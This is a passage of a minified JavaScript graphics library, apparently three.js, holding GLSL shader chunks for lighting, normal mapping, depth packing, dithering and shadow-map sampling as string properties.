directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS )\n\t\tpointLightShadow = pointLightShadows[ i ];\n\t\tdirectLight.color *= all( bvec2( directLight.visible, receiveShadow ) ) ? getPointShadow( pointShadowMap[ i ], pointLightShadow.shadowMapSize, pointLightShadow.shadowBias, pointLightShadow.shadowRadius, vPointShadowCoord[ i ], pointLightShadow.shadowCameraNear, pointLightShadow.shadowCameraFar ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\n\tSpotLight spotLight;\n\t#if defined( USE_SHADOWMAP ) && NUM_SPOT_LIGHT_SHADOWS > 0\n\tSpotLightShadow spotLightShadow;\n\t#endif\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\t\tspotLight = spotLights[ i ];\n\t\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )\n\t\tspotLightShadow = spotLightShadows[ i ];\n\t\tdirectLight.color *= all( bvec2( directLight.visible, receiveShadow ) ) ? getShadow( spotShadowMap[ i ], spotLightShadow.shadowMapSize, spotLightShadow.shadowBias, spotLightShadow.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\n\tDirectionalLight directionalLight;\n\t#if defined( USE_SHADOWMAP ) && NUM_DIR_LIGHT_SHADOWS > 0\n\tDirectionalLightShadow directionalLightShadow;\n\t#endif\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\t\tdirectionalLight = directionalLights[ i ];\n\t\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )\n\t\tdirectionalLightShadow = directionalLightShadows[ i ];\n\t\tdirectLight.color *= all( bvec2( directLight.visible, receiveShadow ) ) ? getShadow( directionalShadowMap[ i ], directionalLightShadow.shadowMapSize, directionalLightShadow.shadowBias, directionalLightShadow.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )\n\tRectAreaLight rectAreaLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {\n\t\trectAreaLight = rectAreaLights[ i ];\n\t\tRE_Direct_RectArea( rectAreaLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if defined( RE_IndirectDiffuse )\n\tvec3 iblIrradiance = vec3( 0.0 );\n\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\n\tirradiance += getLightProbeIrradiance( lightProbe, geometry );\n\t#if ( NUM_HEMI_LIGHTS > 0 )\n\t\t#pragma unroll_loop_start\n\t\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\t\t\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\n\t\t}\n\t\t#pragma unroll_loop_end\n\t#endif\n#endif\n#if defined( RE_IndirectSpecular )\n\tvec3 radiance = vec3( 0.0 );\n\tvec3 clearcoatRadiance = vec3( 0.0 );\n#endif",lights_fragment_maps:"#if defined( RE_IndirectDiffuse )\n\t#ifdef USE_LIGHTMAP\n\t\tvec4 lightMapTexel= texture2D( lightMap, vUv2 );\n\t\tvec3 lightMapIrradiance = lightMapTexelToLinear( lightMapTexel ).rgb * lightMapIntensity;\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tlightMapIrradiance *= PI;\n\t\t#endif\n\t\tirradiance += lightMapIrradiance;\n\t#endif\n\t#if defined( USE_ENVMAP ) && defined( STANDARD ) && defined( ENVMAP_TYPE_CUBE_UV )\n\t\tiblIrradiance += getLightProbeIndirectIrradiance( geometry, maxMipLevel );\n\t#endif\n#endif\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\n\tradiance += getLightProbeIndirectRadiance( geometry.viewDir, geometry.normal, material.specularRoughness, maxMipLevel );\n\t#ifdef CLEARCOAT\n\t\tclearcoatRadiance += getLightProbeIndirectRadiance( geometry.viewDir, geometry.clearcoatNormal, material.clearcoatRoughness, maxMipLevel );\n\t#endif\n#endif",lights_fragment_end:"#if defined( RE_IndirectDiffuse )\n\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\n#endif\n#if defined( RE_IndirectSpecular )\n\tRE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometry, material, reflectedLight );\n#endif",logdepthbuf_fragment:"#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\tgl_FragDepthEXT = vIsPerspective == 0.0 ? gl_FragCoord.z : log2( vFragDepth ) * logDepthBufFC * 0.5;\n#endif",logdepthbuf_pars_fragment:"#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\tuniform float logDepthBufFC;\n\tvarying float vFragDepth;\n\tvarying float vIsPerspective;\n#endif",logdepthbuf_pars_vertex:"#ifdef USE_LOGDEPTHBUF\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\t\tvarying float vFragDepth;\n\t\tvarying float vIsPerspective;\n\t#else\n\t\tuniform float logDepthBufFC;\n\t#endif\n#endif",logdepthbuf_vertex:"#ifdef USE_LOGDEPTHBUF\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\t\tvFragDepth = 1.0 + gl_Position.w;\n\t\tvIsPerspective = float( isPerspectiveMatrix( projectionMatrix ) );\n\t#else\n\t\tif ( isPerspectiveMatrix( projectionMatrix ) ) {\n\t\t\tgl_Position.z = log2( max( EPSILON, gl_Position.w + 1.0 ) ) * logDepthBufFC - 1.0;\n\t\t\tgl_Position.z *= gl_Position.w;\n\t\t}\n\t#endif\n#endif",map_fragment:"#ifdef USE_MAP\n\tvec4 texelColor = texture2D( map, vUv );\n\ttexelColor = mapTexelToLinear( texelColor );\n\tdiffuseColor *= texelColor;\n#endif",map_pars_fragment:"#ifdef USE_MAP\n\tuniform sampler2D map;\n#endif",map_particle_fragment:"#if defined( USE_MAP ) || defined( USE_ALPHAMAP )\n\tvec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;\n#endif\n#ifdef USE_MAP\n\tvec4 mapTexel = texture2D( map, uv );\n\tdiffuseColor *= mapTexelToLinear( mapTexel );\n#endif\n#ifdef USE_ALPHAMAP\n\tdiffuseColor.a *= texture2D( alphaMap, uv ).g;\n#endif",map_particle_pars_fragment:"#if defined( USE_MAP ) || defined( USE_ALPHAMAP )\n\tuniform mat3 uvTransform;\n#endif\n#ifdef USE_MAP\n\tuniform sampler2D map;\n#endif\n#ifdef USE_ALPHAMAP\n\tuniform sampler2D alphaMap;\n#endif",metalnessmap_fragment:"float metalnessFactor = metalness;\n#ifdef USE_METALNESSMAP\n\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\n\tmetalnessFactor *= texelMetalness.b;\n#endif",metalnessmap_pars_fragment:"#ifdef USE_METALNESSMAP\n\tuniform sampler2D metalnessMap;\n#endif",morphnormal_vertex:"#ifdef USE_MORPHNORMALS\n\tobjectNormal *= morphTargetBaseInfluence;\n\tobjectNormal += morphNormal0 * morphTargetInfluences[ 0 ];\n\tobjectNormal += morphNormal1 * morphTargetInfluences[ 1 ];\n\tobjectNormal += morphNormal2 * morphTargetInfluences[ 2 ];\n\tobjectNormal += morphNormal3 * morphTargetInfluences[ 3 ];\n#endif",morphtarget_pars_vertex:"#ifdef USE_MORPHTARGETS\n\tuniform float morphTargetBaseInfluence;\n\t#ifndef USE_MORPHNORMALS\n\t\tuniform float morphTargetInfluences[ 8 ];\n\t#else\n\t\tuniform float morphTargetInfluences[ 4 ];\n\t#endif\n#endif",morphtarget_vertex:"#ifdef USE_MORPHTARGETS\n\ttransformed *= morphTargetBaseInfluence;\n\ttransformed += morphTarget0 * morphTargetInfluences[ 0 ];\n\ttransformed += morphTarget1 * morphTargetInfluences[ 1 ];\n\ttransformed += morphTarget2 * morphTargetInfluences[ 2 ];\n\ttransformed += morphTarget3 * morphTargetInfluences[ 3 ];\n\t#ifndef USE_MORPHNORMALS\n\t\ttransformed += morphTarget4 * morphTargetInfluences[ 4 ];\n\t\ttransformed += morphTarget5 * morphTargetInfluences[ 5 ];\n\t\ttransformed += morphTarget6 * morphTargetInfluences[ 6 ];\n\t\ttransformed += morphTarget7 * morphTargetInfluences[ 7 ];\n\t#endif\n#endif",normal_fragment_begin:"#ifdef FLAT_SHADED\n\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\n\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\n\tvec3 normal = normalize( cross( fdx, fdy ) );\n#else\n\tvec3 normal = normalize( vNormal );\n\t#ifdef DOUBLE_SIDED\n\t\tnormal = normal * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t#endif\n\t#ifdef USE_TANGENT\n\t\tvec3 tangent = normalize( vTangent );\n\t\tvec3 bitangent = normalize( vBitangent );\n\t\t#ifdef DOUBLE_SIDED\n\t\t\ttangent = tangent * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\t\tbitangent = bitangent * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\t#endif\n\t\t#if defined( TANGENTSPACE_NORMALMAP ) || defined( USE_CLEARCOAT_NORMALMAP )\n\t\t\tmat3 vTBN = mat3( tangent, bitangent, normal );\n\t\t#endif\n\t#endif\n#endif\nvec3 geometryNormal = normal;",normal_fragment_maps:"#ifdef OBJECTSPACE_NORMALMAP\n\tnormal = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t#ifdef FLIP_SIDED\n\t\tnormal = - normal;\n\t#endif\n\t#ifdef DOUBLE_SIDED\n\t\tnormal = normal * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t#endif\n\tnormal = normalize( normalMatrix * normal );\n#elif defined( TANGENTSPACE_NORMALMAP )\n\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\tmapN.xy *= normalScale;\n\t#ifdef USE_TANGENT\n\t\tnormal = normalize( vTBN * mapN );\n\t#else\n\t\tnormal = perturbNormal2Arb( -vViewPosition, normal, mapN );\n\t#endif\n#elif defined( USE_BUMPMAP )\n\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\n#endif",normalmap_pars_fragment:"#ifdef USE_NORMALMAP\n\tuniform sampler2D normalMap;\n\tuniform vec2 normalScale;\n#endif\n#ifdef OBJECTSPACE_NORMALMAP\n\tuniform mat3 normalMatrix;\n#endif\n#if ! defined ( USE_TANGENT ) && ( defined ( TANGENTSPACE_NORMALMAP ) || defined ( USE_CLEARCOAT_NORMALMAP ) )\n\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm, vec3 mapN ) {\n\t\tvec3 q0 = vec3( dFdx( eye_pos.x ), dFdx( eye_pos.y ), dFdx( eye_pos.z ) );\n\t\tvec3 q1 = vec3( dFdy( eye_pos.x ), dFdy( eye_pos.y ), dFdy( eye_pos.z ) );\n\t\tvec2 st0 = dFdx( vUv.st );\n\t\tvec2 st1 = dFdy( vUv.st );\n\t\tfloat scale = sign( st1.t * st0.s - st0.t * st1.s );\n\t\tvec3 S = normalize( ( q0 * st1.t - q1 * st0.t ) * scale );\n\t\tvec3 T = normalize( ( - q0 * st1.s + q1 * st0.s ) * scale );\n\t\tvec3 N = normalize( surf_norm );\n\t\tmat3 tsn = mat3( S, T, N );\n\t\tmapN.xy *= ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\treturn normalize( tsn * mapN );\n\t}\n#endif",clearcoat_normal_fragment_begin:"#ifdef CLEARCOAT\n\tvec3 clearcoatNormal = geometryNormal;\n#endif",clearcoat_normal_fragment_maps:"#ifdef USE_CLEARCOAT_NORMALMAP\n\tvec3 clearcoatMapN = texture2D( clearcoatNormalMap, vUv ).xyz * 2.0 - 1.0;\n\tclearcoatMapN.xy *= clearcoatNormalScale;\n\t#ifdef USE_TANGENT\n\t\tclearcoatNormal = normalize( vTBN * clearcoatMapN );\n\t#else\n\t\tclearcoatNormal = perturbNormal2Arb( - vViewPosition, clearcoatNormal, clearcoatMapN );\n\t#endif\n#endif",clearcoat_pars_fragment:"#ifdef USE_CLEARCOATMAP\n\tuniform sampler2D clearcoatMap;\n#endif\n#ifdef USE_CLEARCOAT_ROUGHNESSMAP\n\tuniform sampler2D clearcoatRoughnessMap;\n#endif\n#ifdef USE_CLEARCOAT_NORMALMAP\n\tuniform sampler2D clearcoatNormalMap;\n\tuniform vec2 clearcoatNormalScale;\n#endif",packing:"vec3 packNormalToRGB( const in vec3 normal ) {\n\treturn normalize( normal ) * 0.5 + 0.5;\n}\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\n\treturn 2.0 * rgb.xyz - 1.0;\n}\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256., 256. );\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\nconst float ShiftRight8 = 1. / 256.;\nvec4 packDepthToRGBA( const in float v ) {\n\tvec4 r = vec4( fract( v * PackFactors ), v );\n\tr.yzw -= r.xyz * ShiftRight8;\treturn r * PackUpscale;\n}\nfloat unpackRGBAToDepth( const in vec4 v ) {\n\treturn dot( v, UnpackFactors );\n}\nvec4 pack2HalfToRGBA( vec2 v ) {\n\tvec4 r = vec4( v.x, fract( v.x * 255.0 ), v.y, fract( v.y * 255.0 ));\n\treturn vec4( r.x - r.y / 255.0, r.y, r.z - r.w / 255.0, r.w);\n}\nvec2 unpackRGBATo2Half( vec4 v ) {\n\treturn vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );\n}\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn ( viewZ + near ) / ( near - far );\n}\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\n\treturn linearClipZ * ( near - far ) - near;\n}\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn (( near + viewZ ) * far ) / (( far - near ) * viewZ );\n}\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\n\treturn ( near * far ) / ( ( far - near ) * invClipZ - far );\n}",premultiplied_alpha_fragment:"#ifdef PREMULTIPLIED_ALPHA\n\tgl_FragColor.rgb *= gl_FragColor.a;\n#endif",project_vertex:"vec4 mvPosition = vec4( transformed, 1.0 );\n#ifdef USE_INSTANCING\n\tmvPosition = instanceMatrix * mvPosition;\n#endif\nmvPosition = modelViewMatrix * mvPosition;\ngl_Position = projectionMatrix * mvPosition;",dithering_fragment:"#ifdef DITHERING\n\tgl_FragColor.rgb = dithering( gl_FragColor.rgb );\n#endif",dithering_pars_fragment:"#ifdef DITHERING\n\tvec3 dithering( vec3 color ) {\n\t\tfloat grid_position = rand( gl_FragCoord.xy );\n\t\tvec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );\n\t\tdither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );\n\t\treturn color + dither_shift_RGB;\n\t}\n#endif",roughnessmap_fragment:"float roughnessFactor = roughness;\n#ifdef USE_ROUGHNESSMAP\n\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\n\troughnessFactor *= texelRoughness.g;\n#endif",roughnessmap_pars_fragment:"#ifdef USE_ROUGHNESSMAP\n\tuniform sampler2D roughnessMap;\n#endif",shadowmap_pars_fragment:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tstruct DirectionalLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tstruct SpotLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tstruct PointLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t\tfloat shadowCameraNear;\n\t\t\tfloat shadowCameraFar;\n\t\t};\n\t\tuniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];\n\t#endif\n\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\n\t\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\n\t}\n\tvec2 texture2DDistribution( sampler2D shadow, vec2 uv ) {\n\t\treturn unpackRGBATo2Half( texture2D( shadow, uv ) );\n\t}\n\tfloat VSMShadow (sampler2D shadow, vec2 uv, float compare ){\n\t\tfloat occlusion = 1.0;\n\t\tvec2 distribution = texture2DDistribution( shadow, uv );\n\t\tfloat hard_shadow = step( compare , distribution.x );\n\t\tif (hard_shadow != 1.0 ) {\n\t\t\tfloat distance = compare - distribution.x ;\n\t\t\tfloat variance = max( 0.00000, distribution.y * distribution.y );\n\t\t\tfloat softness_probability = variance / (variance + distance * distance );\t\t\tsoftness_probability = clamp( ( softness_probability - 0.3 ) / ( 0.95 - 0.3 ), 0.0, 1.0 );\t\t\tocclusion = clamp( max( hard_shadow, softness_probability ), 0.0, 1.0 );\n\t\t}\n\t\treturn occlusion;\n\t}\n\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\n\t\tfloat shadow = 1.0;\n\t\tshadowCoord.xyz /= shadowCoord.w;\n\t\tshadowCoord.z += shadowBias;\n\t\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\n\t\tbool inFrustum = all( inFrustumVec );\n\t\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\n\t\tbool frustumTest = all( frustumTestVec );\n\t\tif ( frustumTest ) {\n\t\t#if defined( SHADOWMAP_TYPE_PCF )\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\t\t\tfloat dx0 = - texelSize.x * shadowRadius;\n\t\t\tfloat dy0 = - texelSize.y * shadowRadius;\n\t\t\tfloat dx1 = + texelSize.x * shadowRadius;\n\t\t\tfloat dy1 = + texelSize.y * shadowRadius;\n\t\t\tfloat dx2 = dx0 / 2.0;\n\t\t\tfloat dy2 = dy0 / 2.0;\n\t\t\tfloat dx3 = dx1 / 2.0;\n\t\t\tfloat dy3 = dy1 / 2.0;\n\t\t\tshadow = (\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\n\t\t\t) * ( 1.0 / 17.0 );\n\t\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\t\t\tfloat dx = texelSize.x;\n\t\t\tfloat dy = texelSize.y;\n\t\t\tvec2 uv = shadowCoord.xy;\n\t\t\tvec2 f = fract( uv * shadowMapSize + 0.5 );\n\t\t\tuv -= f * texelSize;\n\t\t\tshadow = (\n\t\t\t\ttexture2DCompare( shadowMap, uv, shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, uv + vec2( dx, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, uv + vec2( 0.0, dy ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, uv + texelSize, shadowCoord.z ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( -dx, 0.0 ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, 0.0 ), shadowCoord.z ),\n\t\t\t\t\t f.x ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( -dx, dy ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, dy ), shadowCoord.z ),\n\t\t\t\t\t f.x ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( 0.0, -dy ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( 0.0, 2.0 * dy ), shadowCoord.z ),\n\t\t\t\t\t f.y ) +\n\t\t\t\tmix( texture2DCompare( shadowMap, uv + vec2( dx, -dy ), shadowCoord.z ), \n\t\t\t\t\t texture2DCompare( shadowMap, uv + vec2( dx, 2.0 * dy ), shadowCoord.z ),\n\t\t\t\t\t f.y ) +\n\t\t\t\tmix( mix( texture2DCompare( shadowMap, uv + vec2( -dx, -dy ), shadowCoord.z ), \n\t\t\t\t\t\t\ttexture2DCompare( shadowMap, uv + vec2( 2.0 * dx, -dy ), shadowCoord.z ),\n\t\t\t\t\t\t\tf.x ),\n\t\t\t\t\t mix( texture2DCompare( shadowMap, uv + vec2( -dx, 2.0 * dy ), shadowCoord.z ), \n\t\t\t\t\t\t\ttexture2DCompare( shadowMap, uv + vec2( 2.0 * dx, 2.0 * dy ), shadowCoord.z ),\n\t\t\t\t\t\t\tf.x ),\n\t\t\t\t\t f.y )\n\t\t\t) * ( 1.0 / 9.0 );\n\t\t#elif defined( SHADOWMAP_TYPE_VSM )\n\t\t\tshadow = VSMShadow( shadowMap, shadowCoord.xy, shadowCoord.z );\n\t\t#else\n\t\t\tshadow = texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\n\t\t#endif\n\t\t}\n\t\treturn shadow;\n\t}\n\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\n\t\tvec3 absV = abs( v );\n\t\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\n\t\tabsV *= scaleToCube;\n\t\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\n\t\tvec2 planar = v.xy;\n\t\tfloat almostATexel = 1.5 * texelSizeY;\n\t\tfloat almostOne = 1.0 - almostATexel;\n\t\tif ( absV.z >= almostOne ) {\n\t\t\tif ( v.z > 0.0 )\n\t\t\t\tplanar.x = 4.0 - v.x;\n\t\t} else if ( absV.x >= almostOne ) {\n\t\t\tfloat signX = sign( v.x );\n\t\t\tplanar.x = v.z * signX + 2.0 * signX;\n\t\t} else if ( absV.y >= almostOne ) {\n\t\t\tfloat signY = sign( v.y );\n\t\t\tplanar.x = v.x + 2.0 * signY + 2.0;\n\t\t\tplanar.y = v.z * signY - 2.0;\n\t\t}\n\t\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\n\t}\n\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {\n\t\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\n\t\tvec3 lightToPosition = shadowCoord.xyz;\n\t\tfloat dp = ( length( lightToPosition ) - shadowCameraNear ) / ( shadowCameraFar - shadowCameraNear );\t\tdp += shadowBias;\n\t\tvec3 bd3D = normalize( lightToPosition );\n\t\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT ) || defined( SHADOWMAP_TYPE_VSM )\n\t\t\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\n\t\t\treturn (\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\n\t\t\t\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\n\t\t\t) * ( 1.0 / 9.0 );\n\t\t#else\n\t\t\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\n\t\t#endif\n\t}\n#endif",shadowmap_pars_vertex:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tstruct DirectionalLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tstruct SpotLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS 